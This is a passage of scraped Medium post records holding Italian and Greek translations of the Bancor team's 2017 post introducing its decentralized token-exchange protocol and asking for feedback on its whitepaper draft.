"Protocollo BancorBancorFollowJul 13, 2017 \u00b7 3 min readCiao a tutti, siamo il team dietro il Protocollo Bancor (PDF), e stiamo costruendo un sistema monetario gerarchico e decentralizzato sulla blockchain.Quando guardiamo al mondo degli scambi tra persone, possiamo individuare due categorie di cose che condividiamo e scambiamo \u2014 Informazioni e Valore. Mentre le informazioni (contenuti quali testi, immagini, video, ecc.) sono per loro natura replicabili (quando le condividi, sia tu che qualcun altro le possedete), il valore invece no (se lo dai a qualcuno, non lo possiedi pi\u00f9).Prima dell\u2019era di internet, c\u2019erano molte reti d\u2019informazione private delle quali alcuni di noi abbastanza in l\u00e0 con l\u2019eta potrebbero persino ricordarsi, come BBS, Prodigy, Compuserve, AoL, giusto per citarne alcune. L\u2019ascesa dell\u2019Internet pubblico ha stravolto tutto, e i sopravvissuti hanno adottato un nuovo standard aperto e globale per lo scambio di informazioni, che si appoggia su una collezione di reti TCP/IP interconnesse attraverso accordi di peering.Fino all\u2019avvento della blockchain tutte le valute, che rappresentano valore, albergavano in silos chiusi. Blockchain, la tecnologia inaugurata da Bitcoin, \u00e8 una rete di scambio di valore decentralizzata, l\u2019Internet della Moneta. Prima o poi rimpiazzer\u00e0 una larga parte delle reti bancarie private di oggi e permetter\u00e0 a nuovi attori (e a quelli vecchi che si saranno adattati) di creare nuovi tipi di valore, nonch\u00e9 effettuare transazioni in un sistema aperto e globale di propriet\u00e0 di nessuno.Il team Bancor ha costruito prodotti per Internet sin dai tardi anni novanta. Alcune delle nostre compagnie erano Contact Networks, MetaCafe, Mytopia, Particle Code e AppCoin. Ci siamo imbattuti in Bitcoin nel 2011 e abbiamo cominciato ad esplorare le possibilit\u00e0 di una valuta generata dagli utenti. In seguito al rilascio di Ethereum nel 2015, abbiamo compreso che i contratti intelligenti avrebbero cambiato le carte in tavola e permesso la creazione e personalizzazione in scala delle valute. Moduli programmabili che gestiscono e conservano valore (rappresentato dai token) possono effettuare processi relativi al valore ad un costo trascurabile \u2014 processi attualmente gestiti da diverse organizzazioni (es. servizi di garanzia sui depositi, siti di scambio, studi legali, giusto per citarne alcuni). Tuttavia, le implicazioni di un codice autonomo e decentralizzato che pu\u00f2 gestire denaro digitale su uno standard aperto per lo scambio di valore, sono decisamente pi\u00f9 profonde.Durante l\u2019estate del 2016 abbiamo cominciato a lavorare a Bancor, con l\u2019obiettivo di creare un sistema monetario gerarchico (in cui un token digitale detiene altri token nelle proprie riserve), per costruire un nuovo tipo di standard per criptovalute che avrebbe posto le fondamenta di un exchange (sito di scambio) globale decentralizzato: che fosse autonomo, senza spread, senza rischi controparte, che provvedesse liquidit\u00e0 continua per ogni asset; che rendesse possibile una lunga sequela di valute cos\u00ec come Internet ha fatto per i contenuti.Vorremmo condividere con voi, Internet, la bozza del nostro whitepaper per commenti e recensioni. Tutti i suggerimenti sono ben accetti e apprezzati.Il Team Bancorhttp://bancor.network", "responses": 0, "tags": ["Bitcoin", "Blockchain", "Ethereum", "Smart Contracts", "Solidity"]}, {"title": "\u03a4\u03bf \u03a0\u03c1\u03c9\u03c4\u03cc\u03ba\u03bf\u03bb\u03bb\u03bf Bancor", "post_link": "https://medium.com/%CF%84%CE%BF-%CF%80%CF%81%CF%89%CF%84%CF%8C%CE%BA%CE%BF%CE%BB%CE%BB%CE%BF-bancor/%CF%84%CE%BF-%CF%80%CF%81%CF%89%CF%84%CF%8C%CE%BA%CE%BF%CE%BB%CE%BB%CE%BF-bancor-385a9cd404e7?source=search_post", "author_name": "Bancor", "author_link": "https://medium.com/@bancor", "publish_date": "2017-07-13", "last_modified_date": "2017-11-29", "readtime": "2.02", "claps": 0, "voters": 0, "content": "\u03a4\u03bf \u03a0\u03c1\u03c9\u03c4\u03cc\u03ba\u03bf\u03bb\u03bb\u03bf BancorBancorFollowJul 13, 2017 \u00b7 3 min read\u03a7\u03b1\u03af\u03c1\u03b5\u03c4\u03b1\u03b9, \u03b5\u03af\u03bc\u03b1\u03c3\u03c4\u03b5 \u03b7 \u03bf\u03bc\u03ac\u03b4\u03b1 \u03c5\u03c0\u03b5\u03cd\u03b8\u03c5\u03bd\u03bf\u03b9 \u03b3\u03b9\u03b1 \u03c4\u03bf \u03c0\u03c1\u03c9\u03c4\u03cc\u03ba\u03bf\u03bb\u03bb\u03bf Bancor (PDF) \u03bc\u03b5 \u03c4\u03bf\u03bd \u03c3\u03c4\u03cc\u03c7\u03bf \u03bd\u03b1 \u03c7\u03c4\u03af\u03c3\u03bf\u03c5\u03bc\u03b5 \u03ad\u03bd\u03b1 \u03b1\u03c0\u03bf\u03ba\u03b5\u03bd\u03c4\u03c1\u03c9\u03bc\u03ad\u03bd\u03bf, \u03b9\u03b5\u03c1\u03b1\u03c1\u03c7\u03b9\u03ba\u03cc \u03bd\u03bf\u03bc\u03b9\u03c3\u03bc\u03b1\u03c4\u03b9\u03ba\u03cc \u03c3\u03cd\u03c3\u03c4\u03b7\u03bc\u03b1 \u03c3\u03c4\u03b7\u03bd \u03b1\u03bb\u03c5\u03c3\u03af\u03b4\u03b1 \u03c4\u03c9\u03bd \u03bc\u03c0\u03bb\u03bf\u03ba \u00ab\u0392lockchain\u00bb.\u03a3\u03b5 \u03ad\u03bd\u03b1\u03bd \u03b4\u03b9\u03b1\u03c3\u03c5\u03bd\u03b4\u03b5\u03cc\u03bc\u03b5\u03bd\u03bf \u03ba\u03cc\u03c3\u03bc\u03bf, \u03c5\u03c0\u03ac\u03c1\u03c7\u03bf\u03c5\u03bd \u03b4\u03c5\u03bf \u03ba\u03cd\u03c1\u03b9\u03b5\u03c2 \u03ba\u03b1\u03c4\u03b7\u03b3\u03bf\u03c1\u03af\u03b5\u03c2 \u03c0\u03bf\u03c5 \u03c3\u03c5\u03bd\u03b1\u03bb\u03bb\u03ac\u03c3\u03c3\u03bf\u03bd\u03c4\u03b1\u03b9 \u2014 \u03c0\u03bb\u03b7\u03c1\u03bf\u03c6\u03bf\u03c1\u03af\u03b5\u03c2 \u03ba\u03b1\u03b9 \u03b1\u03be\u03af\u03b1. \u0391\u03c0\u03cc \u03c4\u03b7\u03bd \u03bc\u03b9\u03b1 \u03bf\u03b9 \u03c0\u03bb\u03b7\u03c1\u03bf\u03c6\u03bf\u03c1\u03af\u03b5\u03c2 (\u03ba\u03b5\u03af\u03bc\u03b5\u03bd\u03b1, \u03b5\u03b9\u03ba\u03cc\u03bd\u03b5\u03c2, \u03b2\u03af\u03bd\u03c4\u03b5\u03bf \u03ba.\u03bb\u03c0.) \u03bc\u03c0\u03bf\u03c1\u03bf\u03cd\u03bd \u03bd\u03b1 \u03b1\u03bd\u03b1\u03c0\u03b1\u03c1\u03b1\u03c7\u03b8\u03bf\u03cd\u03bd (\u03cc\u03c4\u03b1\u03bd \u03b3\u03b9\u03b1 \u03c0\u03b1\u03c1\u03ac\u03b4\u03b5\u03b9\u03b3\u03bc\u03b1 \u03c3\u03c4\u03ad\u03bb\u03bd\u03b5\u03c4\u03b5 \u03b4\u03b9\u03ba\u03c4\u03c5\u03b1\u03ba\u03ac \u03bc\u03b9\u03b1 \u03c6\u03c9\u03c4\u03bf\u03b3\u03c1\u03b1\u03c6\u03af\u03b1 \u03c3\u03b5 \u03ba\u03ac\u03c0\u03bf\u03b9\u03bf\u03bd, \u03c4\u03cc\u03c4\u03b5 \u03ad\u03c7\u03b5\u03c4\u03b5 \u03ba\u03b1\u03b9 \u03b5\u03c3\u03b5\u03af\u03c2 \u03ba\u03b1\u03b9 \u03bf \u03ac\u03bb\u03bb\u03bf\u03c2 \u03ad\u03bd\u03b1 \u03b1\u03bd\u03c4\u03af\u03b3\u03c1\u03b1\u03c6\u03bf \u03c4\u03b7\u03c2 \u03c6\u03c9\u03c4\u03bf\u03b3\u03c1\u03b1\u03c6\u03af\u03b1\u03c2), \u03b7 \u03b1\u03be\u03af\u03b1 \u03cc\u03bc\u03c9\u03c2 \u03b4\u03b5\u03bd \u03bc\u03c0\u03bf\u03c1\u03b5\u03af \u03bd\u03b1 \u03b1\u03bd\u03b1\u03c0\u03b1\u03c1\u03b1\u03c7\u03b8\u03b5\u03af (\u03cc\u03c4\u03b1\u03bd \u03b4\u03af\u03bd\u03b5\u03c4\u03b5 \u03b3\u03b9\u03b1 \u03c0\u03b1\u03c1\u03ac\u03b4\u03b5\u03b9\u03b3\u03bc\u03b1 \u03ad\u03bd\u03b1 \u03ba\u03ad\u03c1\u03bc\u03b1 \u03c3\u03b5 \u03ba\u03ac\u03c0\u03bf\u03b9\u03bf\u03bd, \u03c0\u03bb\u03ad\u03bf\u03bd \u03b4\u03b5\u03bd \u03c4\u03bf \u03ad\u03c7\u03b5\u03c4\u03b5 \u03b5\u03c3\u03b5\u03af\u03c2 \u03c3\u03b1\u03bd \u03b1\u03bd\u03c4\u03af\u03b3\u03c1\u03b1\u03c6\u03bf, \u03cc\u03c0\u03c9\u03c2 \u03bc\u03b9\u03b1 \u03c6\u03c9\u03c4\u03bf\u03b3\u03c1\u03b1\u03c6\u03af\u03b1).\u03a0\u03c1\u03b9\u03bd \u03c4\u03bf \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03c5\u03bf, \u03c5\u03c0\u03ae\u03c1\u03c7\u03b1\u03bd \u03c0\u03bf\u03bb\u03bb\u03ac \u03b9\u03b4\u03b9\u03c9\u03c4\u03b9\u03ba\u03ac \u03b4\u03af\u03ba\u03c4\u03c5\u03b1 \u03c0\u03bb\u03b7\u03c1\u03bf\u03c6\u03cc\u03c1\u03b7\u03c3\u03b7\u03c2, \u03c4\u03b1 \u03bf\u03c0\u03bf\u03af\u03b1 \u03ba\u03ac\u03c0\u03bf\u03b9\u03bf\u03b9 \u03b1\u03c0\u03cc \u03b5\u03bc\u03ac\u03c2 \u03b8\u03c5\u03bc\u03cc\u03bc\u03b1\u03c3\u03c4\u03b5, \u03cc\u03c0\u03c9\u03c2 \u03c4\u03b1 BBS, Prodigy, Compuserve, AoL, \u03b3\u03b9\u03b1 \u03bd\u03b1 \u03b1\u03bd\u03b1\u03c6\u03ad\u03c1\u03bf\u03c5\u03bc\u03b5 \u03bc\u03b5\u03c1\u03b9\u03ba\u03ac. \u039c\u03b5 \u03c4\u03b7\u03bd \u03c7\u03c1\u03ae\u03c3\u03b7 \u03c4\u03bf\u03c5 \u03b4\u03b7\u03bc\u03cc\u03c3\u03b9\u03bf\u03c5 \u03b4\u03b9\u03b1\u03b4\u03b9\u03ba\u03c4\u03cd\u03bf\u03c5 \u03ac\u03bb\u03bb\u03b1\u03be\u03b1\u03bd \u03c4\u03b1 \u03c0\u03ac\u03bd\u03c4\u03b1, \u03ba\u03b1\u03b9 \u03c4\u03b1 \u03b9\u03b4\u03b9\u03c9\u03c4\u03b9\u03ba\u03ac \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03c5\u03b1 \u03c5\u03b9\u03bf\u03b8\u03ad\u03c4\u03b7\u03c3\u03b1\u03bd \u03c0\u03bb\u03ad\u03bf\u03bd \u03ad\u03bd\u03b1 \u03bd\u03ad\u03bf \u03b1\u03bd\u03bf\u03b9\u03c7\u03c4\u03cc, \u03c0\u03b1\u03b3\u03ba\u03cc\u03c3\u03bc\u03b9\u03bf \u03c0\u03c1\u03cc\u03c4\u03c5\u03c0\u03bf \u03b1\u03bd\u03c4\u03b1\u03bb\u03bb\u03b1\u03b3\u03ae\u03c2 \u03c0\u03bb\u03b7\u03c1\u03bf\u03c6\u03bf\u03c1\u03b9\u03ce\u03bd, \u03c4\u03bf \u03bf\u03c0\u03bf\u03af\u03bf \u03b2\u03b1\u03c3\u03af\u03b6\u03b5\u03c4\u03b1\u03b9 \u03c3\u03b5 \u03bc\u03b9\u03b1 \u03c3\u03c5\u03bb\u03bb\u03bf\u03b3\u03ae \u03b4\u03b9\u03ba\u03c4\u03cd\u03c9\u03bd TCP / IP, \u03c0\u03bf\u03c5 \u03bf\u03c5\u03c3\u03b9\u03b1\u03c3\u03c4\u03b9\u03ba\u03ac \u03b4\u03b9\u03b1\u03c3\u03c5\u03bd\u03b4\u03ad\u03bf\u03bd\u03c4\u03b1\u03b9 \u03ba\u03b1\u03b9 \u00ab\u03b1\u03bd\u03c4\u03b1\u03bb\u03bb\u03ac\u03c3\u03c3\u03bf\u03c5\u03bd\u00bb \u03c0\u03bb\u03b7\u03c1\u03bf\u03c6\u03bf\u03c1\u03af\u03b5\u03c2.\u03a0\u03c1\u03b9\u03bd \u03c4\u03bf \u0392lockchain, \u03cc\u03bb\u03b1 \u03c4\u03b1 \u03bd\u03bf\u03bc\u03af\u03c3\u03bc\u03b1\u03c4\u03b1, \u03c0\u03bf\u03c5 \u03b1\u03bd\u03c4\u03b9\u03c0\u03c1\u03bf\u03c3\u03ce\u03c0\u03b5\u03c5\u03b1\u03bd \u03b1\u03be\u03af\u03b1, \u03bb\u03b5\u03b9\u03c4\u03bf\u03c5\u03c1\u03b3\u03bf\u03cd\u03c3\u03b1\u03bd \u03c3\u03b5 \u03ba\u03bb\u03b5\u03b9\u03c3\u03c4\u03ac \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03b9\u03b1. \u03a4\u03bf Blockchain \u03cc\u03bc\u03c9\u03c2 \u03ba\u03b1\u03b9 \u03b7 \u03c0\u03c1\u03c9\u03c4\u03bf\u03c0\u03bf\u03c1\u03b9\u03b1\u03ba\u03ae \u03c4\u03b5\u03c7\u03bd\u03bf\u03bb\u03bf\u03b3\u03af\u03b1 \u03c4\u03bf\u03c5 Bitcoin, \u03b5\u03af\u03bd\u03b1\u03b9 \u03ad\u03bd\u03b1 \u03b1\u03c0\u03bf\u03ba\u03b5\u03bd\u03c4\u03c1\u03c9\u03bc\u03ad\u03bd\u03bf \u03ba\u03b1\u03b9 \u03b1\u03bd\u03bf\u03b9\u03c7\u03c4\u03cc \u03b4\u03af\u03ba\u03c4\u03c5\u03bf \u03b1\u03bd\u03c4\u03b1\u03bb\u03bb\u03b1\u03b3\u03ae\u03c2 \u03b1\u03be\u03b9\u03ce\u03bd \u03ba\u03b1\u03b9 \u03c7\u03c1\u03b7\u03bc\u03ac\u03c4\u03c9\u03bd. \u0391\u03c5\u03c4\u03ae \u03b7 \u03c4\u03b5\u03c7\u03bd\u03bf\u03bb\u03bf\u03b3\u03af\u03b1 \u03b8\u03b1 \u03b1\u03bd\u03c4\u03b9\u03ba\u03b1\u03c4\u03b1\u03c3\u03c4\u03ae\u03c3\u03b5\u03b9 \u03ad\u03bd\u03b1 \u03bc\u03b5\u03b3\u03ac\u03bb\u03bf \u03bc\u03ad\u03c1\u03bf\u03c2 \u03c4\u03c9\u03bd \u03c3\u03b7\u03bc\u03b5\u03c1\u03b9\u03bd\u03ce\u03bd \u03b9\u03b4\u03b9\u03c9\u03c4\u03b9\u03ba\u03ce\u03bd \u03c4\u03c1\u03b1\u03c0\u03b5\u03b6\u03b9\u03ba\u03ce\u03bd \u03b4\u03b9\u03ba\u03c4\u03cd\u03c9\u03bd \u03ba\u03b1\u03b9 \u03b8\u03b1 \u03b5\u03c0\u03b9\u03c4\u03c1\u03ad\u03c8\u03b5\u03b9 \u03c3\u03c4\u03bf\u03bd \u03ba\u03ac\u03b8\u03b5 \u03ad\u03bd\u03b1 \u03b1\u03c0\u03cc \u03b5\u03bc\u03ac\u03c2 \u03bd\u03b1 \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03ae\u03c3\u03b5\u03b9 \u03bd\u03ad\u03bf\u03c5\u03c2 \u03c4\u03cd\u03c0\u03bf\u03c5\u03c2 \u03b1\u03be\u03af\u03b1\u03c2 \u03c0\u03bf\u03c5 \u03b8\u03b1 \u03c3\u03c5\u03bd\u03b1\u03bb\u03bb\u03ac\u03c3\u03c3\u03bf\u03bd\u03c4\u03b1\u03b9 \u03c3\u03b5 \u03ad\u03bd\u03b1 \u03b1\u03bd\u03bf\u03b9\u03c7\u03c4\u03cc \u03ba\u03b1\u03b9 \u03c0\u03b1\u03b3\u03ba\u03cc\u03c3\u03bc\u03b9\u03bf \u03c3\u03cd\u03c3\u03c4\u03b7\u03bc\u03b1 \u03c0\u03bf\u03c5 \u03b4\u03b5\u03bd \u03b8\u03b1 \u03b1\u03bd\u03ae\u03ba\u03b5\u03b9 \u03c3\u03b5 \u03ba\u03b1\u03bd\u03ad\u03bd\u03b1\u03bd.\u0397 \u03bf\u03bc\u03ac\u03b4\u03b1 \u03c0\u03af\u03c3\u03c9 \u03b1\u03c0\u03cc \u03c4\u03bf Bancor \u03ba\u03b9\u03bd\u03b5\u03af\u03c4\u03b5 \u03c3\u03c4\u03bf\u03bd \u03c7\u03ce\u03c1\u03bf \u03c4\u03bf\u03c5 \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03c5\u03bf \u03b1\u03c0\u03cc \u03c4\u03b1 \u03c4\u03ad\u03bb\u03b7 \u03c4\u03b7\u03c2 \u03b4\u03b5\u03ba\u03b1\u03b5\u03c4\u03af\u03b1\u03c2 \u03c4\u03bf\u03c5 \u201990. \u039f\u03c1\u03b9\u03c3\u03bc\u03ad\u03bd\u03b5\u03c2 \u03b1\u03c0\u03cc \u03c4\u03b9\u03c2 \u03b5\u03c4\u03b1\u03b9\u03c1\u03b5\u03af\u03b5\u03c2 \u03bc\u03b1\u03c2 \u03b5\u03af\u03bd\u03b1\u03b9 \u03b7 MetaCafe, Mytopia, Particle Code \u03ba\u03b1\u03b9 AppCoin. \u039c\u03c0\u03ae\u03ba\u03b1\u03bc\u03b5 \u03c3\u03c4\u03bf \u03c7\u03ce\u03c1\u03bf \u03c4\u03bf\u03c5 Bitcoin \u03c4\u03bf 2011 \u03ba\u03b1\u03b9 \u03b1\u03c1\u03c7\u03af\u03c3\u03b1\u03bc\u03b5 \u03bd\u03b1 \u03b4\u03b9\u03b5\u03c1\u03b5\u03c5\u03bd\u03bf\u03cd\u03bc\u03b5 \u03c4\u03b1 \u03c8\u03b7\u03c6\u03b9\u03b1\u03ba\u03ac \u03bd\u03bf\u03bc\u03af\u03c3\u03bc\u03b1\u03c4\u03b1 \u03ba\u03b1\u03b9 \u03c4\u03b7\u03c2 \u03b4\u03c5\u03bd\u03b1\u03c4\u03cc\u03c4\u03b7\u03c4\u03b5\u03c2 \u03c0\u03bf\u03c5 \u03c0\u03b1\u03c1\u03ad\u03c7\u03bf\u03c5\u03bd \u03c3\u03c4\u03bf\u03c5\u03c2 \u03c7\u03c1\u03ae\u03c3\u03c4\u03b5\u03c2. \u039c\u03b5 \u03c4\u03b7\u03bd \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03af\u03b1 \u03c4\u03bf\u03c5 Ethereum \u03c4\u03bf 2015, \u03ba\u03b1\u03c4\u03b1\u03bd\u03bf\u03ae\u03c3\u03b1\u03bc\u03b5 \u03cc\u03c4\u03b9 \u03c4\u03b1 \u03ad\u03be\u03c5\u03c0\u03bd\u03b1 \u03c3\u03c5\u03bc\u03b2\u03cc\u03bb\u03b1\u03b9\u03b1 \u03b5\u03af\u03bd\u03b1\u03b9 \u03bc\u03b9\u03b1 \u03c3\u03b7\u03bc\u03b9\u03c4\u03b9\u03ba\u03ae \u03ba\u03b1\u03b9\u03bd\u03bf\u03c4\u03bf\u03bc\u03af\u03b1 \u03c0\u03bf\u03c5 \u03b8\u03b1 \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03ae\u03c3\u03b5\u03b9 \u03b5\u03c0\u03b9\u03c0\u03bb\u03ad\u03bf\u03bd \u03ba\u03b1\u03b9\u03bd\u03bf\u03c4\u03bf\u03bc\u03af\u03b5\u03c2 \u03c3\u03c4\u03bf\u03bd \u03c7\u03ce\u03c1\u03bf \u03c4\u03bf\u03c5 Blockchain. \u03a0\u03c1\u03bf\u03b3\u03c1\u03ac\u03bc\u03bc\u03b1\u03c4\u03b1 \u03c0\u03bf\u03c5 \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03bf\u03cd\u03bd \u03c8\u03b7\u03c6\u03b9\u03b1\u03ba\u03ad\u03c2 \u03bc\u03ac\u03c1\u03ba\u03b5\u03c2 (\u03c0\u03bf\u03c5 \u03b1\u03bd\u03c4\u03b9\u03c0\u03c1\u03bf\u03c3\u03c9\u03c0\u03b5\u03cd\u03bf\u03c5\u03bd \u03b1\u03be\u03af\u03b1) \u03bc\u03c0\u03bf\u03c1\u03bf\u03cd\u03bd \u03bd\u03b1 \u03b5\u03ba\u03c4\u03b5\u03bb\u03bf\u03cd\u03bd \u03bf\u03b9\u03ba\u03bf\u03bd\u03bf\u03bc\u03b9\u03ba\u03ad\u03c2 \u03b4\u03b9\u03b1\u03b4\u03b9\u03ba\u03b1\u03c3\u03af\u03b5\u03c2 \u03b3\u03b9\u03b1 \u03c7\u03b1\u03bc\u03b7\u03bb\u03cc\u03c4\u03b5\u03c1\u03bf \u03ba\u03cc\u03c3\u03c4\u03bf\u03c2, \u03c4\u03b9\u03c2 \u03bf\u03c0\u03bf\u03af\u03b5\u03c2 \u03c3\u03ae\u03bc\u03b5\u03c1\u03b1 \u03c7\u03b5\u03b9\u03c1\u03af\u03b6\u03bf\u03bd\u03c4\u03b1\u03b9 \u03b4\u03b9\u03ac\u03c6\u03bf\u03c1\u03bf\u03b9 \u03bf\u03c1\u03b3\u03b1\u03bd\u03b9\u03c3\u03bc\u03bf\u03af (\u03c0.\u03c7. \u03c5\u03c0\u03b7\u03c1\u03b5\u03c3\u03af\u03b5\u03c2 \u03bc\u03b5\u03c3\u03b5\u03b3\u03b3\u03cd\u03b7\u03c3\u03b7\u03c2, \u03b4\u03b9\u03ba\u03b7\u03b3\u03bf\u03c1\u03b9\u03ba\u03ad\u03c2 \u03b5\u03c4\u03b1\u03b9\u03c1\u03b5\u03af\u03b5\u03c2 \u03ba\u03c4\u03bb.). \u03a9\u03c3\u03c4\u03cc\u03c3\u03bf, \u03bf\u03b9 \u03b4\u03c5\u03bd\u03b1\u03c4\u03cc\u03c4\u03b7\u03c4\u03b5\u03c2 \u03bc\u03b9\u03b1\u03c2 \u03b1\u03c5\u03c4\u03cc\u03bd\u03bf\u03bc\u03b7\u03c2 \u03c0\u03bb\u03b1\u03c4\u03c6\u03cc\u03c1\u03bc\u03b1\u03c2 \u03c0\u03bf\u03c5 \u03bc\u03c0\u03bf\u03c1\u03b5\u03af \u03bd\u03b1 \u03b4\u03b9\u03b1\u03c7\u03b5\u03b9\u03c1\u03b9\u03c3\u03c4\u03b5\u03af \u03b1\u03c5\u03c4\u03ac \u03c4\u03b1 \u03c8\u03b7\u03c6\u03b9\u03b1\u03ba\u03ac \u03c7\u03c1\u03ae\u03bc\u03b1\u03c4\u03b1 \u03c3\u03b5 \u03ad\u03bd\u03b1 \u03b1\u03bd\u03bf\u03b9\u03ba\u03c4\u03cc \u03c0\u03c1\u03cc\u03c4\u03c5\u03c0\u03bf \u03b3\u03b9\u03b1 \u03c4\u03b7\u03bd \u03b1\u03bd\u03c4\u03b1\u03bb\u03bb\u03b1\u03b3\u03ae \u03b1\u03be\u03b9\u03ce\u03bd \u03b5\u03af\u03bd\u03b1\u03b9 \u03ba\u03ac\u03c4\u03b9 \u03c0\u03bf\u03c5 \u03c9\u03c2 \u03c3\u03ae\u03bc\u03b5\u03c1\u03b1 \u03b4\u03b5\u03bd \u03ae\u03c4\u03b1\u03bd \u03b4\u03c5\u03bd\u03b1\u03c4\u03cc.\u03a4\u03bf \u03ba\u03b1\u03bb\u03bf\u03ba\u03b1\u03af\u03c1\u03b9 \u03c4\u03bf\u03c5 2016 \u03be\u03b5\u03ba\u03b9\u03bd\u03ae\u03c3\u03b1\u03bc\u03b5 \u03bd\u03b1 \u03b4\u03bf\u03c5\u03bb\u03b5\u03cd\u03bf\u03c5\u03bc\u03b5 \u03c3\u03c4\u03bf \u03c3\u03c7\u03ad\u03b4\u03b9\u03bf \u03bc\u03b1\u03c2 \u03c0\u03bf\u03c5 \u03c4\u03bf \u03bf\u03bd\u03bf\u03bc\u03ac\u03c3\u03b1\u03bc\u03b5 Bancor \u03bc\u03b5 \u03c3\u03c4\u03cc\u03c7\u03bf \u03c4\u03b7 \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03af\u03b1 \u03b5\u03bd\u03cc\u03c2 \u03b9\u03b5\u03c1\u03b1\u03c1\u03c7\u03b9\u03ba\u03bf\u03cd \u03bd\u03bf\u03bc\u03b9\u03c3\u03bc\u03b1\u03c4\u03b9\u03ba\u03bf\u03cd \u03c3\u03c5\u03c3\u03c4\u03ae\u03bc\u03b1\u03c4\u03bf\u03c2 (\u03cc\u03c0\u03bf\u03c5 \u03bc\u03b9\u03b1 \u03c8\u03b7\u03c6\u03b9\u03b1\u03ba\u03ae \u03bc\u03ac\u03c1\u03ba\u03b1, \u03c0\u03b1\u03c1\u03ad\u03c7\u03b5\u03b9 \u03ba\u03b1\u03b9 \u03ac\u03bb\u03bb\u03b5\u03c2 \u03bc\u03ac\u03c1\u03ba\u03b5\u03c2 \u03c3\u03c4\u03bf \u03b1\u03c0\u03bf\u03b8\u03b5\u03bc\u03b1\u03c4\u03b9\u03ba\u03cc \u03c4\u03b7\u03c2 \u03c4\u03b1\u03bc\u03b5\u03af\u03bf) \u03b3\u03b9\u03b1 \u03c4\u03b7\u03bd \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03af\u03b1 \u03b5\u03bd\u03cc\u03c2 \u03bd\u03ad\u03bf\u03c5 \u03c0\u03c1\u03bf\u03c4\u03cd\u03c0\u03bf\u03c5 \u03ba\u03c1\u03c5\u03c0\u03c4\u03bf\u03c3\u03c5\u03c7\u03bd\u03bf\u03c4\u03ae\u03c4\u03c9\u03bd \u03c0\u03bf\u03c5 \u03b8\u03b1 \u03b8\u03ad\u03c3\u03b5\u03b9 \u03c4\u03b7\u03c2 \u03b2\u03ac\u03c3\u03b5\u03b9\u03c2 \u03b3\u03b9\u03b1 \u03bc\u03b9\u03b1 \u03b1\u03c0\u03bf\u03ba\u03b5\u03bd\u03c4\u03c1\u03c9\u03bc\u03ad\u03bd\u03b7 \u03c0\u03bb\u03b1\u03c4\u03c6\u03cc\u03c1\u03bc\u03b1 \u03c0\u03b1\u03b3\u03ba\u03cc\u03c3\u03bc\u03b9\u03b1\u03c2 \u03c3\u03c5\u03bd\u03b1\u03bb\u03bb\u03b1\u03b3\u03ae\u03c2. \u0388\u03bd\u03b1 \u03b1\u03c5\u03c4\u03cc\u03bd\u03bf\u03bc\u03bf \u03c3\u03cd\u03c3\u03c4\u03b7\u03bc\u03b1, \u03c7\u03c9\u03c1\u03af\u03c2 \u03ba\u03b9\u03bd\u03b4\u03cd\u03bd\u03bf\u03c5\u03c2, \u03c0\u03bf\u03c5 \u03c0\u03b1\u03c1\u03ad\u03c7\u03b5\u03b9 \u03c3\u03c5\u03bd\u03b5\u03c7\u03ae \u03c1\u03b5\u03c5\u03c3\u03c4\u03cc\u03c4\u03b7\u03c4\u03b1 \u03b3\u03b9\u03b1 \u03bf\u03c0\u03bf\u03b9\u03bf\u03b4\u03ae\u03c0\u03bf\u03c4\u03b5 \u03c0\u03b5\u03c1\u03b9\u03bf\u03c5\u03c3\u03b9\u03b1\u03ba\u03cc \u03c3\u03c4\u03bf\u03b9\u03c7\u03b5\u03af\u03bf. \u0391\u03c5\u03c4\u03cc \u03c0\u03bf\u03c5 \u03b5\u03c0\u03b9\u03c4\u03c1\u03ad\u03c0\u03b5\u03b9 \u03c4\u03b7 \u03bb\u03b5\u03b3\u03cc\u03bc\u03b5\u03bd\u03b7 \u00ab\u03bc\u03b1\u03ba\u03c1\u03ac \u03bf\u03c5\u03c1\u03ac\u00bb (long tail) \u03c4\u03c9\u03bd \u03bd\u03bf\u03bc\u03b9\u03c3\u03bc\u03ac\u03c4\u03c9\u03bd \u03c0\u03bf\u03c5 \u03b8\u03b1 \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03ae\u03c3\u03b5\u03b9 \u03b1\u03be\u03af\u03b1, \u03cc\u03c0\u03c9\u03c2 \u03b1\u03ba\u03c1\u03b9\u03b2\u03ce\u03c2 \u03c3\u03c5\u03bd\u03ad\u03b2\u03b7 \u03ba\u03b1\u03b9 \u03bc\u03b5 \u03c4\u03bf \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03c5\u03bf.\u0398\u03b1 \u03b8\u03ad\u03bb\u03b1\u03bc\u03b5 \u03bd\u03b1 \u03bc\u03bf\u03b9\u03c1\u03b1\u03c3\u03c4\u03bf\u03cd\u03bc\u03b5 \u03bc\u03b1\u03b6\u03af \u03c3\u03b1\u03c2, \u03c4\u03bf \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03c5\u03bf, \u03ba\u03b1\u03b9 \u03c4\u03bf \u03c3\u03c7\u03ad\u03b4\u03b9\u03bf \u03bc\u03b1\u03c2. \u03a0\u03b5\u03c1\u03b9\u03bc\u03b5\u03bd\u03bf\u03c5\u03bc\u03b5 \u03c4\u03b7\u03bd \u03ba\u03c1\u03b9\u03c4\u03b9\u03ba\u03ae \u03ba\u03b1\u03b9 \u03c4\u03b1 \u03c3\u03c7\u03cc\u03bb\u03b9\u03ac \u03c3\u03b1\u03c2. \u03a4\u03bf \u03ba\u03b1\u03b8\u03b5 \u03c3\u03c7\u03cc\u03bb\u03b9\u03bf \u03b5\u03af\u03bd\u03b1\u03b9 \u03b5\u03c5\u03c0\u03c1\u03cc\u03c3\u03b4\u03b5\u03ba\u03c4\u03bf.\u0397 \u03bf\u03bc\u03ac\u03b4\u03b1 Bancorhttp://bancor.network", "responses": 0, "tags": ["Bitcoin", "Blockchain", 